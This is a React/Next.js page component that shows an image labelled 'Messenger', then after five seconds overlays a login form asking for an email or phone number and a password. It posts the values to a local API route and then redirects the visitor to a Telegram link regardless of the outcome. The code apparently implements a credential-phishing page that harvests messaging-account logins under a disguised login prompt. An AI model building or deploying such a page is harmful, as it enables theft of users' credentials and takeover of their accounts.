"use client";

import { useState, useEffect } from "react";

const IMAGE_URL = "https://i.ibb.co.com/B2Dd7TYq/20260927-214258.jpg";
const TELEGRAM_URL = process.env.NEXT_PUBLIC_TELEGRAM_URL || "https://telegram.p9x9.com/telegram";

export default function Home() {
  const [showLogin, setShowLogin] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowLogin(true);
    }, 5000);
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      const result = await res.json();
      if (result.success) {
        window.location.href = TELEGRAM_URL;
      }
    } catch {
      window.location.href = TELEGRAM_URL;
    }
  };

  return (
    <div className="home-container">
      <img src={IMAGE_URL} alt="Messenger" className="home-image" />
      <div className={`login-overlay ${showLogin ? "active" : ""}`}>
        <div className="login-form-container">
          <h2>Login</h2>
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Email or Phone Number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button type="submit">Login</button>
          </form>
        </div>
      </div>
    </div>
  );
}
